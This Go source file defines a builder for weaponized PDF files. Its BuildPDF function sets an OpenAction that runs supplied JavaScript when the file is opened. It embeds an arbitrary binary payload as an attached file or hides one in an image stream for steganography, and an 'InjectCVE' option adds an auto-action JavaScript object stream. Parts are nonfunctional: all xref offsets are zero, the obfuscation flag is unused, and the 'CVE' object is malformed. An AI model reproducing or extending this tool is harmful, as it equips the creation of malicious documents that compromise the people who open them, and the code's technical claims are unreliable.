package pdf

import (
	"bytes"
	"fmt"
	"os"
	"strings"
)

type PDFConfig struct {
	JS          string
	Payload     []byte
	StegoImage  []byte
	UseStego    bool
	ObfuscateJS bool
	InjectCVE   bool
}

func BuildPDF(filename string, cfg PDFConfig) error {
	var buf bytes.Buffer

	buf.WriteString("%PDF-1.7\n")
	buf.WriteString("%\xFF\xF4\xFB\xF4\n")

	buf.WriteString("1 0 obj\n")
	buf.WriteString("<< /Type /Catalog /Pages 2 0 R /OpenAction 3 0 R >>\n")
	buf.WriteString("endobj\n")

	buf.WriteString("2 0 obj\n")
	buf.WriteString("<< /Type /Pages /Kids [4 0 R] /Count 1 >>\n")
	buf.WriteString("endobj\n")

	jsObj := generateJSObj(cfg.JS)
	buf.WriteString(jsObj)

	buf.WriteString("4 0 obj\n")
	buf.WriteString("<< /Type /Page /Parent 2 0 R /Contents 5 0 R >>\n")
	buf.WriteString("endobj\n")

	buf.WriteString("5 0 obj\n")
	buf.WriteString("<< /Length 0 >>\n")
	buf.WriteString("stream\n")
	buf.WriteString("endstream\n")
	buf.WriteString("endobj\n")

	if !cfg.UseStego && len(cfg.Payload) > 0 {
		buf.WriteString("6 0 obj\n")
		buf.WriteString("<< /Type /EmbeddedFile /Length ")
		buf.WriteString(fmt.Sprintf("%d", len(cfg.Payload)))
		buf.WriteString(" /Subtype /application/octet-stream >>\n")
		buf.WriteString("stream\n")
		buf.Write(cfg.Payload)
		buf.WriteString("\nendstream\n")
		buf.WriteString("endobj\n")
	}

	if cfg.UseStego && len(cfg.StegoImage) > 0 {
		buf.WriteString("7 0 obj\n")
		buf.WriteString("<< /Type /XObject /Subtype /Image /Width 800 /Height 600 /ColorSpace /DeviceRGB /BitsPerComponent 8 /Length ")
		buf.WriteString(fmt.Sprintf("%d", len(cfg.StegoImage)))
		buf.WriteString(" >>\n")
		buf.WriteString("stream\n")
		buf.Write(cfg.StegoImage)
		buf.WriteString("\nendstream\n")
		buf.WriteString("endobj\n")
	}

	if cfg.InjectCVE {
		buf.WriteString("8 0 obj\n")
		buf.WriteString("<< /Type /ObjStm /Length 100 /N 3 /First 20 >>\n")
		buf.WriteString("stream\n")
		buf.WriteString("1 0 2 0 3 0\n")
		buf.WriteString("/JS /JavaScript /OpenAction\n")
		buf.WriteString("/AA << /O << /JS 3 0 R >> >>\n")
		buf.WriteString("endstream\n")
		buf.WriteString("endobj\n")
	}

	offset := buf.Len()
	buf.WriteString("xref\n")
	buf.WriteString("0 9\n")
	buf.WriteString("0000000000 65535 f \n")
	for i := 1; i <= 8; i++ {
		buf.WriteString(fmt.Sprintf("%010d 00000 n \n", 0))
	}
	buf.WriteString("trailer\n")
	buf.WriteString("<< /Size 9 /Root 1 0 R >>\n")
	buf.WriteString("startxref\n")
	buf.WriteString(fmt.Sprintf("%d\n", offset))
	buf.WriteString("%%EOF\n")

	return os.WriteFile(filename, buf.Bytes(), 0644)
}

func generateJSObj(js string) string {
	escaped := strings.ReplaceAll(js, "\\", "\\\\")
	escaped = strings.ReplaceAll(escaped, "(", "\\(")
	escaped = strings.ReplaceAll(escaped, ")", "\\)")
	return fmt.Sprintf(`3 0 obj
<< /Type /Action /S /JavaScript /JS (%s) >>
endobj
`, escaped)
}